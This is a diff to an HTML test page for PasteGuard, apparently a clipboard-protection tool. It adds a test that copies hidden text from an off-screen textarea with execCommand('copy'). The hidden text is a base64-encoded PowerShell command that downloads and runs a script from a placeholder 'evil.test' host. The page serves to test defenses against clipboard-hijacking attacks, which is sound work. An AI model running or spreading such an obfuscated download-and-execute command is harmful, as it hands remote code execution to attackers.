@@ -167,6 +167,18 @@
     <span class="result show" id="auto-load-result" style="opacity:1">Waiting for page load test...</span>
   </div>
 
+  <!-- ==================== execCommand copy test ==================== -->
+  <h2>execCommand("copy") — Active Blocking via Copy Event</h2>
+
+  <div class="card high">
+    <div class="label">execCommand copy — PowerShell payload</div>
+    <p>Selects hidden text and copies via <code>document.execCommand("copy")</code>.
+       PasteGuard should intercept the copy event and replace clipboard content.</p>
+    <textarea id="exec-copy-payload" style="position:absolute;left:-9999px" readonly>powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgB0AGUAcwB0AC8AcAAnACkA</textarea>
+    <button class="btn-auto" onclick="execCopyTest()">Trigger execCommand Copy</button>
+    <span class="result" id="exec-copy-result"></span>
+  </div>
+
   <!-- ==================== SAFE (should pass) ==================== -->
   <h2>SAFE — Should NOT be blocked</h2>
 
@@ -259,6 +271,32 @@ console.log(sum(2, 3));</code>
         resultEl.style.color = '#22c55e';
       }
     });
+
+    // --- execCommand("copy") test ---
+    function execCopyTest() {
+      const textarea = document.getElementById('exec-copy-payload');
+      const resultEl = document.getElementById('exec-copy-result');
+      textarea.style.position = 'fixed';
+      textarea.style.left = '0';
+      textarea.style.top = '0';
+      textarea.select();
+      const ok = document.execCommand('copy');
+      textarea.style.position = 'absolute';
+      textarea.style.left = '-9999px';
+
+      // Read back clipboard to check if it was replaced
+      navigator.clipboard.readText().then(text => {
+        if (text.includes('[PasteGuard]')) {
+          showResult(resultEl, 'Blocked! Clipboard replaced by PasteGuard.');
+        } else if (text.includes('powershell')) {
+          showResult(resultEl, 'NOT blocked — payload reached clipboard.');
+        } else {
+          showResult(resultEl, 'execCommand returned: ' + ok + ', clipboard: ' + text.slice(0, 50));
+        }
+      }).catch(err => {
+        showResult(resultEl, 'execCommand: ' + ok + ' (clipboard read denied)');
+      });
+    }
 
     function showResult(el, msg) {
       el.textContent = msg;
